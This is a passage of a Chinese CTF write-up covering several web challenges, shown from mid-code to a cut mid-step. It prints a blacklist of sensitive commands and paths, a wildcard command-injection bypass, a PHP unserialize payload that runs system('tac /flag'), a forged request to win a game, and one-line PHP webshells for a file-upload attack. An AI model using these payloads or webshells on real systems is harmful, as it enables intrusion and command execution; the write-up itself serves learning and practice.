系统版本</span><br><span class="line">            &#x27;environment&#x27; =&gt; $this-&gt;execution_environment, // 环境配置</span><br><span class="line">            &#x27;audit_entries&#x27; =&gt; count($this-&gt;audit_trail),  // 审计日志数量</span><br><span class="line">            &#x27;timestamp&#x27; =&gt; date(&#x27;c&#x27;)                       // ISO8601时间戳</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ==================== 主程序执行流程 ====================</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 创建请求处理器实例</span><br><span class="line"> */</span><br><span class="line">$system_processor = new RequestProcessor();</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 检查User-Agent头并处理输入</span><br><span class="line"> * 这是系统的主要入口点</span><br><span class="line"> */</span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_USER_AGENT&#x27;])) &#123;</span><br><span class="line">    $user_agent_string = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">    </span><br><span class="line">    // 处理User-Agent字符串作为输入</span><br><span class="line">    $processing_result = $system_processor-&gt;processUserInput($user_agent_string);</span><br><span class="line">    </span><br><span class="line">    // 如果处理失败，记录错误日志</span><br><span class="line">    if ($processing_result[&#x27;status&#x27;] !== &#x27;SUCCESS&#x27;) &#123;</span><br><span class="line">        error_log(&quot;Processing failed: &quot; . ($processing_result[&#x27;public_message&#x27;] ?? &#x27;Unknown error&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ==================== 调试功能 ====================</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 源代码查看功能</span><br><span class="line"> * 添加 ?source=1 到URL即可查看源代码</span><br><span class="line"> */</span><br><span class="line">if (isset($_GET[&#x27;source&#x27;]) &amp;&amp; $_GET[&#x27;source&#x27;] == &#x27;1&#x27;) &#123;</span><br><span class="line">    highlight_file(__FILE__);  // PHP内置语法高亮函数</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计，其实逻辑很简单。就是输入UA，合法就执行，不合法就不执行，无回显。</p>
<p>重点查看$validation_rules,那里就是过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private $validation_rules = [</span><br><span class="line">        // 模式黑名单 - 防止恶意输入</span><br><span class="line">        &#x27;pattern_blacklist&#x27; =&gt; [</span><br><span class="line">            // 主黑名单: 禁止cat、flag、env等敏感命令</span><br><span class="line">            &#x27;primary&#x27; =&gt; &#x27;/cat|flag|env/i&#x27;,</span><br><span class="line">            // 次黑名单: 防止路径遍历攻击</span><br><span class="line">            &#x27;secondary&#x27; =&gt; [&#x27;/\.\.\//&#x27;, &#x27;/\/etc\//&#x27;, &#x27;/\/passwd/&#x27;]</span><br><span class="line">        ],</span><br><span class="line">        // 最大输入长度限制</span><br><span class="line">        &#x27;max_length&#x27; =&gt; 1024,</span><br><span class="line">        // 允许的字符集正则表达式</span><br><span class="line">        &#x27;allowed_chars&#x27; =&gt; &#x27;/^[a-zA-Z0-9_\-\$\(\)\=\&lt;\&gt;\.\&#x27;\&quot;\s\;\\\:\+\*\?\[\]\&#123;\&#125;\|\/]+$/&#x27;</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure>

<p>就过滤了一些敏感命令和字符，白名单几乎涵盖了所有用的上的东西。</p>
<p>payload: <code>system(&#39;nl /fl?? &gt; 1.txt&#39;)</code>;</p>
<p>解释；system是php的一个函数，用于执行系统命令。服务器一般都是linux命令。nl是linux读取文件内容的一种方式，可以替代cat，?是linux通配符,可以匹配任意一个字符。&gt;是输出定向，意思是把读取到的内容写入1.txt。执行后，访问&#x2F;1.txt即可获得flag</p>
<h3 id="1-Div3-井字棋小游戏"><a href="#1-Div3-井字棋小游戏" class="headerlink" title="[1-Div3]井字棋小游戏"></a><strong>[1-Div3]井字棋小游戏</strong></h3><p>F12后可以看到一段被混淆的js代码，用jsdecoder解密得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">const _0x2f277c = _0xf5a2;</span><br><span class="line">(function (_0x575f65, _0x1acbf2) &#123;</span><br><span class="line">  const _0x4bf314 = _0xf5a2,</span><br><span class="line">    _0x33a5e4 = _0x575f65();</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const _0x4935a5 = -parseInt(_0x4bf314(0xa4)) / 0x1 + -parseInt(_0x4bf314(0xb5)) / 0x2 * (parseInt(_0x4bf314(0xa3)) / 0x3) + -parseInt(_0x4bf314(0xaf)) / 0x4 + -parseInt(_0x4bf314(0xb3)) / 0x5 + parseInt(_0x4bf314(0xcb)) / 0x6 + parseInt(_0x4bf314(0xb2)) / 0x7 * (parseInt(_0x4bf314(0xac)) / 0x8) + parseInt(_0x4bf314(0xc0)) / 0x9;</span><br><span class="line">      if (_0x4935a5 === _0x1acbf2) break;else _0x33a5e4[&#x27;push&#x27;](_0x33a5e4[&#x27;shift&#x27;]());</span><br><span class="line">    &#125; catch (_0x4d3521) &#123;</span><br><span class="line">      _0x33a5e4[&#x27;push&#x27;](_0x33a5e4[&#x27;shift&#x27;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(_0xee03, 0xb0ffc);</span><br><span class="line">const boardElement = document[_0x2f277c(0xc1)](_0x2f277c(0xae)),</span><br><span class="line">  statusElement = document[&#x27;getElementById&#x27;](_0x2f277c(0xc3)),</span><br><span class="line">  restartButton = document[&#x27;getElementById&#x27;](_0x2f277c(0xb9)),</span><br><span class="line">  humanPlayer = &#x27;X&#x27;,</span><br><span class="line">  aiPlayer = &#x27;O&#x27;;</span><br><span class="line">function _0xee03() &#123;</span><br><span class="line">  const _0x7efae8 = [&#x27;你先请！&#x27;, &#x27;classList&#x27;, &#x27;7pvARju&#x27;, &#x27;3136445uqjqBC&#x27;, &#x27;some&#x27;, &#x27;147818hJoUTS&#x27;, &#x27;Content-Type&#x27;, &#x27;filter&#x27;, &#x27;div&#x27;, &#x27;restart-button&#x27;, &#x27;flag:&#x27;, &#x27;textContent&#x27;, &#x27;setRequestHeader&#x27;, &#x27;fill&#x27;, &#x27;length&#x27;, &#x27;/fl4gggg_gy56dwdccfs_l&#x27;, &#x27;16179381xKFDVH&#x27;, &#x27;getElementById&#x27;, &#x27;children&#x27;, &#x27;status&#x27;, &#x27;application/json&#x27;, &#x27;dataset&#x27;, &#x27;恭喜你贏了！...等一下，这不应该发生！&#x27;, &#x27;score&#x27;, &#x27;pla&#x27;, &#x27;POST&#x27;, &#x27;createElement&#x27;, &#x27;7892910kBkoey&#x27;, &#x27;index&#x27;, &#x27;onreadystatechange&#x27;, &#x27;39wNQRQS&#x27;, &#x27;136070diMCsk&#x27;, &#x27;addEventListener&#x27;, &#x27;error&#x27;, &#x27;stringify&#x27;, &#x27;every&#x27;, &#x27;readyState&#x27;, &#x27;send&#x27;, &#x27;innerHTML&#x27;, &#x27;1527880GZloMk&#x27;, &#x27;平局！&#x27;, &#x27;board&#x27;, &#x27;3420060CAGavc&#x27;];</span><br><span class="line">  _0xee03 = function () &#123;</span><br><span class="line">    return _0x7efae8;</span><br><span class="line">  &#125;;</span><br><span class="line">  return _0xee03();</span><br><span class="line">&#125;</span><br><span class="line">let gameBoard,</span><br><span class="line">  gameActive = true;</span><br><span class="line">function startGame() &#123;</span><br><span class="line">  const _0xc54e87 = _0x2f277c;</span><br><span class="line">  gameBoard = Array(0x9)[_0xc54e87(0xbd)](null), gameActive = true, statusElement[_0xc54e87(0xbb)] = _0xc54e87(0xb0), boardElement[_0xc54e87(0xab)] = &#x27;&#x27;;</span><br><span class="line">  for (let _0x33b9ac = 0x0; _0x33b9ac &lt; 0x9; _0x33b9ac++) &#123;</span><br><span class="line">    const _0x2b98e8 = document[_0xc54e87(0xca)](_0xc54e87(0xb8));</span><br><span class="line">    _0x2b98e8[_0xc54e87(0xb1)][&#x27;add&#x27;](&#x27;cell&#x27;), _0x2b98e8[_0xc54e87(0xc5)][_0xc54e87(0xcc)] = _0x33b9ac, _0x2b98e8[_0xc54e87(0xa5)](&#x27;click&#x27;, handleCellClick), boardElement[&#x27;appendChild&#x27;](_0x2b98e8);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">function handleCellClick(_0x54eff7) &#123;</span><br><span class="line">  const _0x4ef309 = _0x2f277c,</span><br><span class="line">    _0x2e6c6a = _0x54eff7[&#x27;target&#x27;][&#x27;dataset&#x27;][_0x4ef309(0xcc)];</span><br><span class="line">  if (gameBoard[_0x2e6c6a] || !gameActive) return;</span><br><span class="line">  makeMove(_0x2e6c6a, humanPlayer);</span><br><span class="line">  if (checkWinner(gameBoard, humanPlayer)) &#123;</span><br><span class="line">    endGame(_0x4ef309(0xc6));</span><br><span class="line">    const _0x465e3e = new XMLHttpRequest();</span><br><span class="line">    _0x465e3e[&#x27;open&#x27;](_0x4ef309(0xc9), _0x4ef309(0xbf), true), _0x465e3e[_0x4ef309(0xbc)](_0x4ef309(0xb6), _0x4ef309(0xc4)), _0x465e3e[_0x4ef309(0xcd)] = function () &#123;</span><br><span class="line">      const _0x1fd957 = _0x4ef309;</span><br><span class="line">      if (_0x465e3e[_0x1fd957(0xa9)] === 0x4 &amp;&amp; _0x465e3e[&#x27;status&#x27;] === 0xc8) alert(_0x1fd957(0xba) + _0x465e3e[&#x27;responseText&#x27;]);else _0x465e3e[_0x1fd957(0xa9)] === 0x4 &amp;&amp; console[_0x1fd957(0xa6)](&#x27;错误:&#x27;, _0x465e3e[&#x27;statusText&#x27;]);</span><br><span class="line">    &#125;, strr = _0x4ef309(0xc8), strr = strr + &#x27;yer___&#x27;;</span><br><span class="line">    const _0x89a94 = JSON[_0x4ef309(0xa7)](&#123;</span><br><span class="line">      &#x27;winner&#x27;: strr</span><br><span class="line">    &#125;);</span><br><span class="line">    _0x465e3e[_0x4ef309(0xaa)](_0x89a94);</span><br><span class="line">    return;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    if (isBoardFull(gameBoard)) &#123;</span><br><span class="line">      endGame(_0x4ef309(0xad));</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  gameActive = false, statusElement[_0x4ef309(0xbb)] = &#x27;AI\x20正在思考...&#x27;, setTimeout(() =&gt; &#123;</span><br><span class="line">    const _0x211b29 = _0x4ef309,</span><br><span class="line">      _0x34db12 = getBestMove(gameBoard);</span><br><span class="line">    makeMove(_0x34db12, aiPlayer);</span><br><span class="line">    if (checkWinner(gameBoard, aiPlayer)) endGame(&#x27;AI\x20获胜！&#x27;);else isBoardFull(gameBoard) ? endGame(_0x211b29(0xad)) : (statusElement[&#x27;textContent&#x27;] = &#x27;轮到你了！&#x27;, gameActive = true);</span><br><span class="line">  &#125;, 0x1f4);</span><br><span class="line">&#125;</span><br><span class="line">function makeMove(_0x2a4953, _0x4d6d24) &#123;</span><br><span class="line">  const _0x1797c8 = _0x2f277c;</span><br><span class="line">  gameBoard[_0x2a4953] = _0x4d6d24;</span><br><span class="line">  const _0x159969 = boardElement[_0x1797c8(0xc2)][_0x2a4953];</span><br><span class="line">  _0x159969[&#x27;textContent&#x27;] = _0x4d6d24, _0x159969[_0x1797c8(0xb1)][&#x27;add&#x27;](_0x4d6d24[&#x27;toLowerCase&#x27;]());</span><br><span class="line">&#125;</span><br><span class="line">function _0xf5a2(_0x133660, _0x555acb) &#123;</span><br><span class="line">  const _0xee0323 = _0xee03();</span><br><span class="line">  return _0xf5a2 = function (_0xf5a2ad, _0x2a2b4d) &#123;</span><br><span class="line">    _0xf5a2ad = _0xf5a2ad - 0xa3;</span><br><span class="line">    let _0x398357 = _0xee0323[_0xf5a2ad];</span><br><span class="line">    return _0x398357;</span><br><span class="line">  &#125;, _0xf5a2(_0x133660, _0x555acb);</span><br><span class="line">&#125;</span><br><span class="line">function checkWinner(_0x16d7bb, _0x53d738) &#123;</span><br><span class="line">  const _0x863b32 = _0x2f277c,</span><br><span class="line">    _0x399774 = [[0x0, 0x1, 0x2], [0x3, 0x4, 0x5], [0x6, 0x7, 0x8], [0x0, 0x3, 0x6], [0x1, 0x4, 0x7], [0x2, 0x5, 0x8], [0x0, 0x4, 0x8], [0x2, 0x4, 0x6]];</span><br><span class="line">  return _0x399774[_0x863b32(0xb4)](_0x559d8b =&gt; &#123;</span><br><span class="line">    const _0x3ef0c6 = _0x863b32;</span><br><span class="line">    return _0x559d8b[_0x3ef0c6(0xa8)](_0x5a8de2 =&gt; _0x16d7bb[_0x5a8de2] === _0x53d738);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">function isBoardFull(_0xe2713) &#123;</span><br><span class="line">  const _0x14f013 = _0x2f277c;</span><br><span class="line">  return _0xe2713[_0x14f013(0xa8)](_0xdbee2d =&gt; _0xdbee2d !== null);</span><br><span class="line">&#125;</span><br><span class="line">function endGame(_0x162c83) &#123;</span><br><span class="line">  const _0x1f92c4 = _0x2f277c;</span><br><span class="line">  statusElement[_0x1f92c4(0xbb)] = _0x162c83, gameActive = false;</span><br><span class="line">&#125;</span><br><span class="line">restartButton[_0x2f277c(0xa5)](&#x27;click&#x27;, startGame);</span><br><span class="line">function getBestMove(_0x11af1f) &#123;</span><br><span class="line">  return minimax(_0x11af1f, aiPlayer)[&#x27;index&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">function minimax(_0x19aa06, _0x15aea9) &#123;</span><br><span class="line">  const _0x100675 = _0x2f277c,</span><br><span class="line">    _0x48f4ab = _0x19aa06[&#x27;map&#x27;]((_0x122cea, _0x143a70) =&gt; _0x122cea === null ? _0x143a70 : null)[_0x100675(0xb7)](_0x5b29f9 =&gt; _0x5b29f9 !== null);</span><br><span class="line">  if (checkWinner(_0x19aa06, humanPlayer)) return &#123;</span><br><span class="line">    &#x27;score&#x27;: -0xa</span><br><span class="line">  &#125;;else &#123;</span><br><span class="line">    if (checkWinner(_0x19aa06, aiPlayer)) return &#123;</span><br><span class="line">      &#x27;score&#x27;: 0xa</span><br><span class="line">    &#125;;else &#123;</span><br><span class="line">      if (_0x48f4ab[&#x27;length&#x27;] === 0x0) return &#123;</span><br><span class="line">        &#x27;score&#x27;: 0x0</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  const _0xee554b = [];</span><br><span class="line">  for (let _0x59515e = 0x0; _0x59515e &lt; _0x48f4ab[_0x100675(0xbe)]; _0x59515e++) &#123;</span><br><span class="line">    const _0x43fdc6 = &#123;&#125;;</span><br><span class="line">    _0x43fdc6[_0x100675(0xcc)] = _0x48f4ab[_0x59515e], _0x19aa06[_0x48f4ab[_0x59515e]] = _0x15aea9;</span><br><span class="line">    if (_0x15aea9 === aiPlayer) &#123;</span><br><span class="line">      const _0xb38790 = minimax(_0x19aa06, humanPlayer);</span><br><span class="line">      _0x43fdc6[_0x100675(0xc7)] = _0xb38790[_0x100675(0xc7)];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      const _0x575b46 = minimax(_0x19aa06, aiPlayer);</span><br><span class="line">      _0x43fdc6[_0x100675(0xc7)] = _0x575b46[_0x100675(0xc7)];</span><br><span class="line">    &#125;</span><br><span class="line">    _0x19aa06[_0x48f4ab[_0x59515e]] = null, _0xee554b[&#x27;push&#x27;](_0x43fdc6);</span><br><span class="line">  &#125;</span><br><span class="line">  let _0x17adb5;</span><br><span class="line">  if (_0x15aea9 === aiPlayer) &#123;</span><br><span class="line">    let _0x332060 = -Infinity;</span><br><span class="line">    for (let _0x3ea13d = 0x0; _0x3ea13d &lt; _0xee554b[_0x100675(0xbe)]; _0x3ea13d++) &#123;</span><br><span class="line">      _0xee554b[_0x3ea13d][_0x100675(0xc7)] &gt; _0x332060 &amp;&amp; (_0x332060 = _0xee554b[_0x3ea13d][_0x100675(0xc7)], _0x17adb5 = _0x3ea13d);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    let _0x34f0c8 = Infinity;</span><br><span class="line">    for (let _0x58658d = 0x0; _0x58658d &lt; _0xee554b[_0x100675(0xbe)]; _0x58658d++) &#123;</span><br><span class="line">      _0xee554b[_0x58658d][&#x27;score&#x27;] &lt; _0x34f0c8 &amp;&amp; (_0x34f0c8 = _0xee554b[_0x58658d][_0x100675(0xc7)], _0x17adb5 = _0x58658d);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return _0xee554b[_0x17adb5];</span><br><span class="line">&#125;</span><br><span class="line">startGame();</span><br></pre></td></tr></table></figure>

<p>审计代码发现，当人类玩家获胜时，会向服务器<code>/fl4gggg_gy56dwdccfs_l</code>发送POST请求，请求体中包含<code>&#123;&quot;winner&quot;:&quot;player___&quot;&#125;</code>，并显示返回的flag。</p>
<p>构造请求包如下即可获得flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /fl4gggg_gy56dwdccfs_l HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:59885</span><br><span class="line">sec-ch-ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">&#123;&quot;winner&quot;:&quot;player___&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Div1-ezUnser"><a href="#1-Div1-ezUnser" class="headerlink" title="[1-Div1]ezUnser"></a>[1-Div1]ezUnser</h3><p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ser_a1 = $_POST[&#x27;a&#x27;];</span><br><span class="line">$ser_b1 = $_POST[&#x27;b&#x27;];</span><br><span class="line">$c = $_POST[&#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">$obj_a1 = unserialize($ser_a1);</span><br><span class="line">$obj_b1 = unserialize($ser_b1);</span><br><span class="line"></span><br><span class="line">$ser_a2 = serialize(unserialize($ser_a1));</span><br><span class="line">$ser_b2 = serialize(unserialize($ser_b1));</span><br><span class="line"></span><br><span class="line">$obj_a2 = unserialize($ser_a2);</span><br><span class="line">$obj_b2 = unserialize($ser_b2);</span><br><span class="line"></span><br><span class="line">if(get_class($obj_a1) === get_class($obj_a2) || get_class($obj_b1) === get_class($obj_b2))&#123;</span><br><span class="line">    die(&quot;Nope&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($ser_a1 != $ser_a2 &amp;&amp; $ser_b1 != $ser_b2) &#123;</span><br><span class="line">    ($obj_a2-&gt;$c())($obj_b2-&gt;$c());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里涉及到一个小trick,当序列化时候，发现类未定义，就会由属性 PHP_Incomplete_Class来存储类名。当其在反序列化时候，就会将PHP_Incomplete_Class来作为类名，而$PHP_Incomplete_Class_Name这个属性用来存储类名。然后再次序列化，就会读取$PHP_Incomplete_Class_Name这个属性，将其内容作为序列化后的类名，如果这个类名仍未定义，则仍旧是__PHP_Incomplete_Class。而题目中没有定义类，因此想要绕过，我们需要用到php的内置类。例如，</p>
<p>a&#x3D;O:1:”A”:2:{s:1:”a”;s:1:”b”;s:27:”__PHP_Incomplete_Class_Name”;s:5:”Error”;}，</p>
<p>此时get_class($obj_a1)&#x3D;__PHP_Incomplete_Class，而get_class($obj_a2)&#x3D;Error, 从而绕过die，进行执行。</p>
<p>然后我们来看($obj_a2-&gt;$c())($obj_b2-&gt;$c());</p>
<p>Error类中有一个属性message,带有方法getMessage,可以返回message的内容，这是我们可以操控的。所以当$c&#x3D;getMessage时候，我将题目简化成了这样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a($b);</span><br></pre></td></tr></table></figure>

<p>其实就是简单的命令执行了，payload 如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=O:1:&quot;A&quot;:2:&#123;s:7:&quot;message&quot;;s:6:&quot;system&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:5:&quot;Error&quot;;&#125;</span><br><span class="line">&amp;b=O:1:&quot;A&quot;:2:&#123;s:7:&quot;message&quot;;s:9:&quot;tac /flag&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:5:&quot;Error&quot;;&#125;</span><br><span class="line">&amp;c=getMessage</span><br></pre></td></tr></table></figure>

<p>执行命令system(“tac &#x2F;flag”),获得flag。</p>
<h3 id="1-Div1-5-apacherrr"><a href="#1-Div1-5-apacherrr" class="headerlink" title="[1-Div1.5]apacherrr"></a>[1-Div1.5]apacherrr</h3><p>访问发现配置文件，丢给ai让他解释一下。</p>
<p>发现由三个虚拟机组成。</p>
<p>第一个虚拟机：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot /var/www/html/config</span><br><span class="line">    &lt;Directory /var/www/html/config&gt;</span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride None</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>默认主机</strong>：没有指定 <code>ServerName</code>，作为默认主机</p>
</li>
<li><p><strong>网站根目录</strong>：<code>/var/www/html/config</code></p>
</li>
<li><p><strong>目录权限</strong>：</p>
<ul>
<li><p><code>Indexes</code>：允许目录列表（如果没有索引文件）</p>
</li>
<li><p><code>FollowSymLinks</code>：允许跟踪符号链接</p>
</li>
<li><p><code>AllowOverride None</code>：忽略 <code>.htaccess</code> 文件</p>
</li>
<li><p><code>Require all granted</code>：允许所有访问</p>
</li>
</ul>
</li>
</ul>
<p>第二个虚拟机：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName uploaderrr.com</span><br><span class="line">    DocumentRoot /var/www/html/uploads</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>域名</strong>：<code>uploaderrr.com</code></li>
<li><strong>网站根目录</strong>：<code>/var/www/html/uploads</code></li>
<li>其他配置与第一个相同</li>
</ul>
<p>第三个虚拟机:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName whuctf2025.com</span><br><span class="line">    DocumentRoot /var/www/html</span><br><span class="line">    &lt;Directory /var/www/html&gt;</span><br><span class="line">        AllowOverride All</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">    &lt;FilesMatch &quot;\.php$&quot;&gt;</span><br><span class="line">        Require all denied</span><br><span class="line">    &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>域名</strong>：<code>whuctf2025.com</code></p>
</li>
<li><p><strong>网站根目录</strong>：<code>/var/www/html</code></p>
</li>
<li><p><strong>特殊配置</strong>：</p>
<ul>
<li><code>AllowOverride All</code>：允许使用 <code>.htaccess</code> 文件覆盖配置</li>
<li><strong>禁止 PHP 执行</strong>：所有 <code>.php</code> 文件都被拒绝访问</li>
</ul>
</li>
</ul>
<p>那么接下思路就明确了。</p>
<p>这是一个常考的文件上传漏洞。</p>
<p>首先写一个1.txt木马，内容为<code>&lt;?=`$_POST[1]`?&gt;</code>或者<code>&lt;?php @eval($_POSt[1]); ?&gt;</code></p>
<p>然后写一个.htaccess文件，内容为</p>
